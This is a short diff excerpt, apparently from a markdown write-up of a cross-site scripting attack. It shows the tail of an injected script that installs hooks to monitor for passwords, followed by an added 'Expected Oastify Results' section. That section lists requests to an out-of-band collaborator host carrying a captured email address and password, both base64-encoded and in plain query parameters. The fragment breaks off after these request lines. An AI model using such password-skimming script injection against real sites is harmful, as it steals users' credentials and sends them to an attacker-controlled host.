@@ -152,3 +152,14 @@
     console.log('[XSS] All hooks installed - monitoring for passwords');
     
 })();
+```
+
+## Expected Oastify Results
+
+You should see requests like:
+
+**1. Password found immediately:**
+```
+GET /found?d=eyJ0eXBlIjoicGFzc3dvcmRfZm91bmQiLCJmYWtlX3VzZXJuYW1lIjoiNHFtOGptOGlmQG1vem1haWwuY29tIiwiZmFrZV9wYXNzd29yZCI6Ilczc0F4U3N6N2pdRio3RkYifQ==
+
+GET /password?user=4qm8jm8if@mozmail.com&pass=W3AxSsz7j]F*7FF
